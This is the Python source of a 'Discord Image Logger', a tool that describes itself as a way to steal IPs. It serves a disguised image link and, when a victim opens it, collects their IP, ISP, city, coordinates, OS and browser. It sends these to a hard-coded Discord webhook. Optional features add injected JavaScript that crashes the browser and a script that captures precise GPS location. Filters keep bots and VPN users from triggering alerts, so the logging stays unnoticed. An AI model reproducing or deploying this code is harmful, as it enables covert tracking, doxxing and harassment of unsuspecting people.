# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1090057534448087082/F2quAxEHobB17IukvN4Qdj40Z2M5MqfOf68wSGfyl4xyJ5rajqL0G0ntWTdTWtt074n5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
